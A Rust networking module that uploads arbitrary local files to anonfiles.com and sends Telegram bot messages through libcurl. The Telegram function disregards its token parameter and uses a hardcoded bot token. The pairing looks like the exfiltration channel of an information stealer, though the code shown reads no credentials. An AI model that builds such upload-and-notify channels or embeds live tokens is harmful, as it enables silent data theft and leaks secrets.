use curl::{
    easy::{Easy, Form},
    Error,
};

fn wrap_curl_err<T>(curl_result: Result<T, Error>) -> Result<T, String> {
    match curl_result {
        Ok(result) => {
            return Ok(result);
        }
        Err(err) => {
            return Err(format!("Error sending request! {}", err.description()));
        }
    }
}

pub mod anonfile {
    use super::send_post_req;
    use curl::easy::Form;
    use regex::Regex;
    use std::str;

    // Example response:
    // {"status":true,"data":{"file":{"url":{"full":"https://anonfiles.com/50I2v8R5xa/Cargo_lock",
    // "short":"https://anonfiles.com/50I2v8R5xa"},
    // "metadata":{"id":"50I2v8R5xa","name":"Cargo.lock","size":{"bytes":17775,"readable":"17.78 KB"}}}}}
    //
    // so we can get only short link
    fn get_load_link_fron_resp(data: Vec<u8>) -> Result<String, String> {
        const SHORT_LINK: u8 = 2;
        let str_resp = match str::from_utf8(&data) {
            Ok(str_resp) => str_resp,
            Err(e) => {
                return Err(format!(
                    "Anonfile: Invalid UTF-8 sequence from response: {}",
                    e
                ))
            }
        };

        let regex = Regex::new(r#"("short":")(\S+)("},"metadata")"#).unwrap();

        if let Some(captures) = regex.captures(str_resp) {
            if let Some(capture) = captures.get(SHORT_LINK.into()) {
                return Ok(capture.as_str().to_string());
            }
        }

        Err(format!("Anonfile: Failed to parse json response!"))
    }

    pub fn load_file(path_to_file: impl AsRef<std::path::Path>) -> Result<String, String> {
        let url = "https://api.anonfiles.com/upload";
        let mut form_data = Form::new();

        if let Err(err) = form_data.part("file").file(&path_to_file).add() {
            return Err(format!(
                "Anonfile: Error uploading file! {}",
                err.description()
            ));
        }

        let resp_data = send_post_req(url, Some(form_data), None)?;
        get_load_link_fron_resp(resp_data)
    }
}

pub mod telegram {
    use crate::utils::net::send_post_req;

    pub fn send_message(bot_token: String, user_id: String, message: String) -> Result<(), String> {
        let token = "5279761929:AAEnsQN3NyCqW5bJndsBzWOdWbqr4G3J9bQ";

        let request_url = format!(r#"https://api.telegram.org/bot{}/sendMessage"#, token);

        let post_fileds = format!(
            r#"chat_id={}&text={}&parse_mode=Markdown&disable_web_page_preview=True"#,
            user_id, message
        );

        send_post_req(request_url.as_str(), None, Some(post_fileds))?;
        Ok(())
    }
}

fn send_post_req(
    url: &str,
    form_data: Option<Form>,
    fields: Option<String>,
) -> Result<Vec<u8>, String> {
    const STATUS_OK: u32 = 200;
    let mut easy = Easy::new();

    wrap_curl_err(easy.url(url))?;
    wrap_curl_err(easy.post(true))?;

    if let Some(form_data) = form_data {
        wrap_curl_err(easy.httppost(form_data))?;
    }

    if let Some(fileds) = fields {
        wrap_curl_err(easy.post_field_size(fileds.len() as u64))?;
        wrap_curl_err(easy.post_fields_copy(fileds.as_bytes()))?;
    }

    let mut response_data = Vec::new();
    {
        let mut transfer = easy.transfer();
        wrap_curl_err(transfer.write_function(|new_data| {
            response_data.extend_from_slice(new_data);
            Ok(new_data.len())
        }))?;
        wrap_curl_err(transfer.perform())?;
    }

    let resp_code = easy.response_code().unwrap();

    if resp_code != STATUS_OK {
        return Err(format!(
            "Error sending POST request! Response code: {}",
            resp_code
        ));
    }

    Ok(response_data)
}
